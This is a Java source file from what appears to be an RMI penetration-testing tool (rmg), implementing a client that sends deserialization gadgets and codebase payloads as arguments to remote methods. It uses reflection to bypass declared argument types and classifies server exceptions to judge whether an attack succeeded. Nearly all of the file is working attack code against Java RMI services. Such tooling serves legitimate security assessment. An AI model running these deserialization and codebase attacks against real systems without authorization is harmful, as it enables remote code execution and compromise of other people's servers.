package de.qtc.rmg.operations;

import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.Map;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;
import de.qtc.rmg.utils.RMGUtils;
import javassist.CannotCompileException;
import javassist.CtClass;
import javassist.NotFoundException;

/**
 * The method attacker is used to invoke RMI methods on the application level with user controlled
 * objects as method arguments. It can be used to attempt codebase and deserialization attacks on
 * known remote methods. Usually, you use first the *guess* operation to enumerate remote methods and
 * then you use the *method* operation to check them for codebase and deserialization vulnerabilities.
 *
 * The MethodAttacker was one of the first operation classes in rmg and is therefore not fully optimized
 * to the currently available other utility classes. It may be restructured in future.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class RemoteObjectClient {

    private ObjID objID;
    private RMIWhisperer rmi;
    private MethodCandidate targetMethod;

    private Field proxyField;
    private Field remoteField;

    private int legacyMode;
    private String boundName;
    private String methodName;
    private String remoteClass;
    private String randomClassName;

    /**
     * The RemoteObjectClient makes use of the official RMI API to obtain the RemoteObject from the RMI registry.
     * Afterwards, it needs access to the underlying UnicastRemoteRef to perform customized RMi calls. Depending
     * on the RMI version of the server (current Proxy approach or legacy stub objects), this requires access to
     * a different field within the Proxy or RemoteObject class. Both fields are made accessible within the constructor
     * to make the actual attacking code more clean.
     *
     * @param rmiRegistry registry to perform lookup operations
     * @param classes list of unknown classes per bound name
     * @param targetMethod the remote method to target
     */
    public RemoteObjectClient(RMIWhisperer rmiRegistry, String boundName, String remoteClass, MethodCandidate targetMethod, int legacyMode)
    {
        this.objID = null;
        this.rmi = rmiRegistry;
        this.boundName = boundName;
        this.legacyMode = legacyMode;
        this.remoteClass = remoteClass;
        this.targetMethod = targetMethod;

        try {
            this.proxyField = Proxy.class.getDeclaredField("h");
            this.remoteField = RemoteObject.class.getDeclaredField("ref");
            proxyField.setAccessible(true);
            remoteField.setAccessible(true);

        } catch(NoSuchFieldException | SecurityException e) {
            ExceptionHandler.unexpectedException(e, "MethodAttacker", "instantiation", true);
        }

        try {
            methodName = targetMethod.getName();
        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "compliation", "process", true);
        }
    }

    public RemoteObjectClient(RMIWhisperer rmiRegistry, int objID, MethodCandidate targetMethod, int legacyMode)
    {
        this.rmi = rmiRegistry;
        this.legacyMode = legacyMode;
        this.objID = new ObjID(objID);
        this.targetMethod = targetMethod;
        try {
            methodName = targetMethod.getName();
        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "compliation", "process", true);
        }
    }

    /**
     * This lengthy method performs the actual method call. If no bound name was specified, it iterates
     * over all available bound names on the registry. After some initialization, the function checks the
     * specified MethodCandidate for non primitive arguments and determines whether the remote endpoint
     * uses legacy stubs. Non primitive arguments are required for codebase and deserialization attacks,
     * whereas the legacy status of the server is required to decide whether to create the remote classes
     * as interface or stub classes on the client side. Within legacy RMI, stub classes are required on the
     * client side, but current RMI implementations only need an interface that is assigned to a Proxy.
     *
     * Depending on the determined legacy status, an interface or legacy stub class is now created dynamically.
     * With the corresponding class now available on the class path, the RemoteObject can be looked up on the
     * registry. From the obtained object, the RemoteRef is then extracted by using reflection. With this remote
     * reference, a customized RMI call can now be dispatched.
     *
     * This low level RMI access is required to call methods with invalid argument types. During deserialization
     * attacks you may want to call a method that expects a HashMap with some other serialized object. When using
     * ordinary RMI to make the call, Java would refuse to use anything other than a HashMap during the call, as
     * it would violate the interface definition. With low level RMI access, the call arguments can be manually
     * written to the stream which allows to use arbitrary arguments for the call.
     *
     * @param gadget object to use during the RMI call. Usually a payload object created by ysoserial
     * @param boundName optional bound name to target. If null, target all bound names
     * @param argumentPosition specify the argument position to attack. If negative, automatically search for non primitive
     * @param operationMode the function was upgraded to support two operations 'codebase' or 'attack'
     * @param legacyMode whether to enforce legacy stubs. 0 -> auto, 1 -> enforce legacy, 2 -> enforce normal
     */

    public void gadgetCall(Object gadget, int argumentPosition)
    {
        int attackArgument = findNonPrimitiveArgument(argumentPosition);

        Logger.printGadgetCallIntro("RMI");
        printIntro(attackArgument);

        Map<Object,Class<?>> argumentArray = prepareArgumentArray(gadget, attackArgument);
        RemoteRef remoteRef = getRemoteRef();

        try {
            rmi.genericCall(null, -1, this.targetMethod.getHash(), argumentArray, false, methodName, remoteRef);

            Logger.eprintln("Remote method invocation didn't cause any exception.");
            Logger.eprintln("This is unusual and the attack probably didn't work.");

        } catch (java.rmi.ServerException e) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.rmi.UnmarshalException ) {
                Logger.eprintlnMixedYellow("Method", this.targetMethod.getSignature(), "does not exist on this bound name.");
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException ) {

                if( e.getMessage().contains(randomClassName) ) {
                    ExceptionHandler.deserializeClassNotFoundRandom(e, "deserialization", "attack", randomClassName);

                } else {
                    ExceptionHandler.deserializeClassNotFound(e);
                }

            } else if( cause instanceof java.security.AccessControlException ) {
                ExceptionHandler.accessControl(e, "deserialization", "attack");

            } else {
                ExceptionHandler.unexpectedException(e, "deserialization", "attack", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, true);

        } catch( java.security.AccessControlException e ) {
            ExceptionHandler.accessControl(e, "deserialization", "attack");

        } catch( java.rmi.UnmarshalException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            if( t instanceof java.lang.ClassNotFoundException ) {
                Logger.eprintlnMixedYellow("Caught local", "ClassNotFoundException", "during deserialization attack.");
                Logger.eprintlnMixedBlue("This usually occurs when the", "gadget caused an exception", "on the server side.");
                Logger.printlnMixedYellow("You probably entered entered an", "invalid command", "for the gadget.");
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "deserialization", "attack", false);
            }

        } catch( Exception e ) {
                ExceptionHandler.unknownDeserializationException(e);

        }
    }

    public void codebaseCall(Object gadget, int argumentPosition)
    {
        int attackArgument = findNonPrimitiveArgument(argumentPosition);

        Logger.printCodebaseAttackIntro("RMI", methodName, gadget.getClass().getName());
        printIntro(attackArgument);

        Map<Object,Class<?>> argumentArray = prepareArgumentArray(gadget, attackArgument);
        RemoteRef remoteRef = getRemoteRef();

        try {
            rmi.genericCall(null, -1, this.targetMethod.getHash(), argumentArray, true, methodName, remoteRef);

            Logger.eprintln("Remote method invocation didn't cause any exception.");
            Logger.eprintln("This is unusual and the attack probably didn't work.");

        } catch (java.rmi.ServerException e) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.rmi.UnmarshalException ) {
                Logger.eprintlnMixedYellow("Method", this.targetMethod.getSignature(), "does not exist on this bound name.");
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassNotFoundException ) {

                String exceptionMessage = e.getMessage();

                if( exceptionMessage.contains("RMI class loader disabled") ) {
                    ExceptionHandler.codebaseSecurityManager(e);
                }

                else if( exceptionMessage.contains(gadget.getClass().getName()) ) {
                    ExceptionHandler.codebaseClassNotFound(e, gadget.getClass().getName());
                }

                else if( exceptionMessage.contains(randomClassName) ) {
                    ExceptionHandler.codebaseClassNotFoundRandom(e, randomClassName, gadget.getClass().getName());

                } else {
                    ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
                }

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, "codebase", "attack");

            } else if( cause instanceof java.security.AccessControlException ) {
                ExceptionHandler.accessControl(e, "codebase", "attack");

            } else {
                ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, true);

        } catch( java.security.AccessControlException e ) {
            ExceptionHandler.accessControl(e, "codebase", "attack");

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
        }
    }

    public void genericCall(Object[] argumentArray)
    {
        CtClass rtype = null;
        RemoteRef remoteRef = getRemoteRef();
        Map<Object,Class<?>> callArguemnts = null;

        try {
            rtype = targetMethod.getMethod().getReturnType();
            callArguemnts = RMGUtils.applyParameterTypes(targetMethod.getMethod(), argumentArray);
        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "preparation", "of remote method call", true);
        }

        try {
            rmi.genericCall(null, -1, this.targetMethod.getHash(), callArguemnts, false, this.methodName, remoteRef, rtype);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "generic call", "operation", false);
        }
    }

    private void printIntro(int attackArgument)
    {
        Logger.printMixedBlue("Using non primitive argument type", this.targetMethod.getArgumentTypeName(attackArgument));
        Logger.printlnPlainMixedBlue(" on position", String.valueOf(attackArgument));
        Logger.printlnMixedYellow("Specified method signature is", this.targetMethod.getSignature());

        Logger.println("");
    }

    private RemoteRef getRemoteRef()
    {
        if(this.objID == null)
            return getRemoteRefByName();
        else
            return this.rmi.getRemoteRef(this.objID);
    }

    private RemoteRef getRemoteRefByName()
    {
        boolean isLegacy = RMGUtils.isLegacy(this.remoteClass, this.legacyMode, true);

        Remote instance = null;
        RemoteRef remoteReference = null;

        try {
            if( !isLegacy ) {
                RMGUtils.makeInterface(this.remoteClass, this.targetMethod);
                instance = rmi.getRegistry().lookup(boundName);

                RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
                remoteReference = ref.getRef();

            } else {
                RMGUtils.makeLegacyStub(this.remoteClass, this.targetMethod);
                instance = rmi.getRegistry().lookup(boundName);

                remoteReference = (RemoteRef)remoteField.get(instance);
            }

        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "remote reference lookup", "operation", true);
        }

        return remoteReference;
    }

    private int findNonPrimitiveArgument(int position)
    {
        int attackArgument = 0;

        try {
            attackArgument = this.targetMethod.getPrimitive(position);

        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "search", "for primitive types", true);
        }

        if( attackArgument == -1 ) {

            if( position == -1 )
                Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", this.targetMethod.getSignature());

            RMGUtils.exit();
        }

        return attackArgument;
    }

    private Map<Object,Class<?>> prepareArgumentArray(Object gadget, int attackArgument)
    {
        Object[] methodArguments = null;

        try {
            methodArguments = RMGUtils.getArgumentArray(this.targetMethod.getMethod());
        } catch (Exception e) {
            ExceptionHandler.unexpectedException(e, "argument array", "construction", true);
        }

        Object[] payloadArray = new Object[2];
        Object randomInstance = null;

        try {
            Class<?> randomClass = RMGUtils.makeRandomClass();
            randomInstance = randomClass.newInstance();

        } catch (Exception e) {
            randomInstance = new DefinitelyNonExistingClass();
        }

        this.randomClassName = randomInstance.getClass().getName();

        payloadArray[0] = gadget;
        payloadArray[1] = randomInstance;
        methodArguments[attackArgument] = payloadArray;

        Map<Object,Class<?>> callArguments = null;
        try {
            callArguments = RMGUtils.applyParameterTypes(this.targetMethod.getMethod(), methodArguments);
        } catch(Exception e) {
            ExceptionHandler.unexpectedException(e, "parameter types", "mapping", true);
        }

        return callArguments;
    }
}
